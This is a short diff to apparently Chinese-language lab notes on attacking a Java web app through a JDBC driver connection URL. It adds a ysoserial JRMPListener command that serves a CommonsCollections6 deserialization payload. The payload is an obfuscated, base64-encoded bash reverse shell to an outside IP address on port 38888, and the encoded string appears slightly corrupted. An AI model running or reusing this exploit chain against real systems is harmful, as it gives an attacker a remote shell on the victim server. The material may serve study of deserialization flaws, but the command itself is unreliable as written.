@@ -22,3 +22,9 @@ java -jar -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005 
 curl 192.168.142.1:8080/app3/testConnection/ -d 'Driver=com.tinysoft.jdbc.bridge.client.ClientDriver&url=jdbc:tsserver://127.0.0.1:3306/test'
 # jdbc:tsserver 地址是是从服务器端发起的请求地址.
 ```
+
+# ysoserial
+
+```sh
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JAAvZGVDL3RjcC8xMjEuNDAuMjUzLjE3Ny8zODg4OCAwPiYx}|{base64,-d}|{bash,-i}"
+```
